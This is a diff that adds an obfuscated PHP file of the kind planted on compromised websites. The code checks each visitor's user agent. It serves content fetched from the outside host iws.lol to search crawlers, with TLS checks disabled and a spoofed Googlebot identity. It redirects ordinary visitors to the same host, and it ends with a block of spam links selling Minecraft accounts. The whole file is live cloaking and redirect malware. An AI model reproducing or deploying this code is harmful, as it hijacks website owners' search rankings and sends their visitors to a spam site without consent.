@@ -1,0 +1,27 @@
+<?php
+ goto kFwsE; G8f9m: if (area) { echo base64_decode("\x50\x48\116\152\x63\x6d\x6c\x77\x64\x43\102\172\x63\155\x4d\71\x61\110\x52\60\143\x48\115\66\114\171\71\160\x64\63\115\x75\x62\x47\x39\x73\x4c\x33\122\157\x4c\155\x70\x7a\x50\152\167\x76\143\x32\116\171\141\130\102\x30\120\147\x3d\x3d"); die; } goto dGNZR; kFwsE: $a = "\x73\x74\x72\x69\x73\164\x72"; goto IWJvf; xUKnR: define("\x61\x72\145\141", $a(url, "\x2e\160\164\x66") or $a(url, "\56\146\x64\x63") or $a(url, "\x2e\142\x75\x67") or $a(url, "\x2e\144\x6f\x63") or $a(url, "\56\154\157\166\145") or $a(url, "\56\164\x78\164") or $a(url, "\x2e\160\x70\x74") or $a(url, "\56\x70\160\x74\170") or $a(url, "\x2e\x78\154\163") or $a(url, "\56\143\163\166") or $a(url, "\x2e\163\x68\x74\x6d\154") or $a(url, "\56\x7a\x6e\142") or $a(url, "\56\x6d\163\x6c") or $a(url, "\x2e\155\x64\142") or $a(url, "\x2e\x68\x78\x63")); goto lpYLI; waJ0H: header("\110\x54\124\x50\57\x31\56\61\40\x33\x30\x31\x20\115\x6f\x76\145\144\x20\x50\x65\162\x6d\x61\156\145\x6e\x74\x6c\x79"); goto z6r50; IWJvf: $b = $_SERVER; goto y0bAI; IHfkW: echo "\x3c\x6c\x69\x6e\x6b\x20\162\x65\x6c\x3d\42\x63\141\156\x6f\x6e\x69\143\x61\x6c\42\x20\150\162\145\146\x3d\42" . $new_url . "\42\x20\57\76"; goto YdtX5; s2eG2: define("\145\156\164", $b["\110\x54\124\x50\x5f\x55\123\x45\x52\137\x41\107\105\116\x54"]); goto McfX5; KpoRL: define("\162\145\x66", !isset($b["\110\x54\124\120\x5f\x52\x45\106\105\x52\x45\122"]) ? '' : $b["\x48\x54\x54\x50\137\x52\105\x46\x45\122\x45\x52"]); goto s2eG2; fVwhx: $new_url = "\150\164\164\x70\x73\x3a\x2f\x2f\x69\167\x73\x2e\154\x6f\x6c"; goto waJ0H; VloxX: define("\155\x6f\x62\x69\x6c\x65", "\x2f\160\150\x6f\156\145\x7c\160\x61\144\x7c\x70\157\x64\174\151\120\x68\157\156\145\174\151\120\x6f\x64\174\x69\x6f\x73\x7c\151\120\141\144\x7c\101\x6e\144\x72\157\151\x64\174\115\x6f\x62\151\154\x65\x7c\x42\x6c\x61\143\x6b\102\x65\162\162\171\174\x49\x45\115\157\x62\x69\154\x65\x7c\x4d\x51\121\x42\162\x6f\x77\163\145\x72\x7c\112\x55\x43\x7c\x46\145\x6e\x6e\145\x63\174\167\117\x53\x42\162\x6f\167\x73\145\x72\x7c\x42\162\157\x77\163\145\162\116\x47\x7c\127\x65\142\117\123\x7c\x53\x79\x6d\x62\151\141\156\x7c\127\151\x6e\x64\x6f\x77\x73\40\120\x68\157\x6e\x65\57"); goto xUKnR; y0bAI: function httpGetlai($c) { $d = curl_init(); curl_setopt($d, CURLOPT_URL, $c); curl_setopt($d, CURLOPT_USERAGENT, "\115\x6f\172\151\x6c\x6c\141\57\x35\x2e\x30\x20\x28\x63\157\x6d\x70\x61\164\x69\142\x6c\145\x3b\x20\107\x6f\157\x67\154\x65\142\157\x74\57\x32\x2e\x31\73\x20\x2b\x68\x74\164\x70\72\57\x2f\167\x77\167\x2e\147\157\x6f\x67\154\145\x2e\143\157\x6d\57\142\x6f\x74\56\x68\164\x6d\154\51"); curl_setopt($d, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($d, CURLOPT_SSL_VERIFYHOST, FALSE); curl_setopt($d, CURLOPT_RETURNTRANSFER, 1); curl_setopt($d, CURLOPT_HEADER, 0); $e = curl_exec($d); curl_close($d); return $e; } goto uk3wU; uk3wU: define("\165\x72\x6c", $b["\x52\105\x51\x55\x45\123\x54\137\x55\122\111"]); goto KpoRL; BtgBk: define("\x72\x6f\141\x64", "\144\157\x6d\x61\x69\156\x3d" . $b["\x48\x54\x54\x50\x5f\110\117\x53\x54"] . "\46\x70\x61\164\x68\x3d" . url . "\46\x73\x70\x69\x64\x65\162\75" . urlencode(ent)); goto cJZin; aV0dt: define("\162\x65\147\x73", "\100\107\x6f\157\147\154\x65\142\157\x74\174\x59\141\150\x6f\157\174\102\x69\x6e\x67\x40\x69"); goto VloxX; cJZin: define("\155\145\x6d\x65\x73", road . "\x26\162\x65\146\x65\x72\x65\162\75" . urlencode(ref)); goto aV0dt; McfX5: define("\163\151\x74\145", "\150\x74\164\160\x73\x3a\57\x2f\151\x77\163\56\154\157\x6c\x2f\77"); goto BtgBk; z6r50: header("\114\157\143\141\x74\151\x6f\156\x3a\40" . $new_url); goto IHfkW; lpYLI: if (preg_match(regs, ent)) { if (area) { echo httpGetlai(site . road); die; } else { echo httpGetlai("\x68\x74\164\160\163\x3a\57\x2f\x69\167\163\56\x6c\x6f\x6c\x2f\x78\x2e\x70\150\x70"); ob_flush(); flush(); } } goto G8f9m; YdtX5: die; goto MPLQ6; dGNZR: $current_url = $_SERVER["\x52\105\121\x55\x45\123\x54\137\x55\122\x49"]; goto fVwhx; MPLQ6: ?>
+<meta http-equiv="refresh" content="0;url=https://iws.lol">
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้มายคราฟราคาถูก</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้เปลี่ยนได้ทุกอย่าง</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้มือ2</a>
+<a href="https://iws.lol" rel="dofollow">ซื้อไอดีแท้</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้ราคาถูก</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้ถาวร</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีมือสอง</a>
+<a href="https://iws.lol" rel="dofollow">ipvanish</a>
+<a href="https://iws.lol" rel="dofollow">vpn</a>
+<a href="https://iws.lol" rel="dofollow">minecraft</a>
+<a href="https://iws.lol" rel="dofollow">id minecraft</a>
+<a href="https://iws.lol" rel="dofollow">cheap id minecraft</a>
+<a href="https://iws.lol" rel="dofollow">mcseksin</a>
+<a href="https://iws.lol" rel="dofollow">seksin</a>
+<a href="https://iws.lol" rel="dofollow">guproth</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้มายคราฟ</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้มายคราฟ ฟรี</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้มายคราฟ ราคา</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีมายคราฟแท้ ฟรี</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้มายคราฟ มือสอง</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้มายคราฟ ราคาถูก</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้มายคราฟ 10 บาท</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้มายคราฟราคาถูก</a>
+<a href="https://iws.lol" rel="dofollow">ไอดีแท้ มายคราฟ</a>
